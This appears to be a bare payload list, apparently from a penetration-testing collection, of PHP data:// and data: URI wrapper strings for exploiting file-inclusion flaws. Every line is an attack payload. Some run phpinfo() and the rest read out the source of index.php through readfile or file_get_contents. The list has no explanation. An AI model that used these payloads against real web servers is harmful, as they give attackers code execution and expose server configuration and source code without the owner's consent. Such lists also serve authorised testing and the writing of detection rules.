## PHP_Data_Payloads
    
    data:text/plain,<?php phpinfo(); ?>
    data://text/plain,<?php phpinfo(); ?>
    data:application/x-php,<?php phpinfo(); ?>
    data://application/x-php,<?php phpinfo(); ?>
    data:application/x-httpd-php,<?php phpinfo(); ?>
    data://application/x-httpd-php,<?php phpinfo(); ?>
    data:application/x-php,<?php echo readfile('index.php'); ?>
    data://application/x-php,<?php echo readfile('index.php'); ?>
    data:text/plain,<?php echo readfile('index.php'); ?>
    data://text/plain,<?php echo readfile('index.php'); ?>
    data:text/plain,<?php echo file_get_contents('index.php'); ?>
    data://text/plain,<?php echo file_get_contents('index.php'); ?>
    data://application/x-httpd-php,<?php echo readfile('index.php'); ?>
